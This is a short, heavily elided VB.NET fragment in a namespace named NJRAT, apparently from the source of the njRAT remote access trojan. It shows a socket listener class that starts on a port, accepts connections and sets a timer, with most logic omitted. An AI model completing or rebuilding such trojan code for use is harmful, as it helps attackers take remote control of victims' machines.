...
Namespace NJRAT
    Public Class SK
        ...
        Public Sub New(ByVal port As Integer)
            ...
            Me.S.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, False)
            Me.S.Start(&H270F)
        ...
        Public Sub accept(ByVal ar As IAsyncResult)
            Try
                ...
                item.t.Change(0, interval_count * 1000)
        ...
        Public interval_count As Int32
    End Class
End Namespace
